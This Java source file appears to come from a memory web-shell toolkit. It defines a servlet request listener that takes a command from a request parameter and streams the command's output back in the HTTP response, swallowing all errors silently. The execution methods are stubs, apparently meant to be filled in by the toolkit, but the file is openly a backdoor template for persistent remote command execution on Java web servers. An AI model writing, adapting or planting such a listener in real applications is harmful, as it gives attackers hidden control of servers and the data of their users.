package com.reajason.javaweb.memshell.shelltool.command;

import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;

/**
 * @author ReaJason
 */
public class CommandListener implements ServletRequestListener {
    private static String paramName;

    public CommandListener() {
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String cmd) throws Exception {
        return null;
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            String cmd = getParam(request.getParameter(paramName));
            if (cmd != null) {
                HttpServletResponse servletResponse = (HttpServletResponse) getResponseFromRequest(request);
                InputStream inputStream = getInputStream(cmd);
                ServletOutputStream outputStream = servletResponse.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
            }
        } catch (Exception ignored) {
        }
    }

    private Object getResponseFromRequest(Object request) throws Exception {
        return null;
    }
}
